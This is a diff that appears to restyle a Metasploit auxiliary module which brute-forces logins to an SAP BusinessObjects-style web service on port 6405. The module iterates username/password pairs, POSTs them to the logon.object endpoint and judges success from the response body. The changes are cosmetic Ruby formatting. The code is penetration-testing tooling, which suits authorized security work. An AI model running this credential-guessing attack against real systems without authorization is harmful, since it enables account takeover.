@@ -1,14 +1,12 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 require 'msf/core'
 
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::AuthBrute
@@ -29,21 +27,22 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        Opt::RPORT(6405),
-      ], self.class)
+        Opt::RPORT(6405)
+      ], self.class
+    )
     register_autofilter_ports([ 6405 ])
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     res = send_request_cgi({
-      'uri'	 => "/PlatformServices/service/app/logon.object",
-      'method'  => 'GET'
-    }, 25)
-    return if not res
+                             'uri'	 => "/PlatformServices/service/app/logon.object",
+                             'method' => 'GET'
+                           }, 25)
+    return unless res
 
-    each_user_pass { |user, pass|
-      enum_user(user,pass)
-    }
+    each_user_pass do |user, pass|
+      enum_user(user, pass)
+    end
   end
 
   def report_cred(opts)
@@ -82,17 +81,17 @@ class MetasploitModule < Msf::Auxiliary
     data << '&authType=secEnterprise&backUrl=%2FApp%2Fhome.faces'
     begin
       res = send_request_cgi({
-        'uri'		  => '/PlatformServices/service/app/logon.object',
-        'data'		 => data,
-        'method'	   => 'POST',
-        'headers'	  =>
+                               'uri'		  => '/PlatformServices/service/app/logon.object',
+                               'data'		 => data,
+                               'method'	   => 'POST',
+                               'headers'	  =>
               {
                 'Connection' => "keep-alive",
-                'Accept-Encoding' => "gzip,deflate",
-              },
-      }, 45)
-      return :abort if (!res or (res and res.code != 200))
-      if(res.body.match(/Account Information/i))
+                'Accept-Encoding' => "gzip,deflate"
+              }
+                             }, 45)
+      return :abort if !res || (res && (res.code != 200))
+      if res.body =~ /Account Information/i
         success = false
       else
         success = true
